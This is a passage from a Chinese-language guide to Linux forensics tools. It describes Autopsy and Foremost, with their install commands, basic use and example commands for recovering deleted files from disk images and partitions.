- **核心定位**：开源数字取证平台，用于硬盘镜像、内存镜像、移动设备的电子数据取证，支持文件恢复、日志分析、浏览器历史提取、注册表分析等功能，是数字取证的核心工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y autopsy`
- **基础用法**：启动命令`sudo autopsy`→访问http://localhost:9999→新建案件→添加取证镜像→执行自动分析→提取相关证据。

##### 3. Foremost
- **核心定位**：开源文件carving数据恢复工具，可从硬盘镜像、磁盘分区、U盘等介质中，根据文件特征恢复删除的文件，支持图片、文档、视频、压缩包等多种格式。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y foremost`
- **常用示例**
  ```bash
  # 从磁盘镜像中恢复所有支持的文件
  foremost -i image.dd -o recovery
  # 从磁盘分区中恢复jpg/png图片
  foremost -t jpg,png -i /dev/sdb -o pic_recovery
  ```
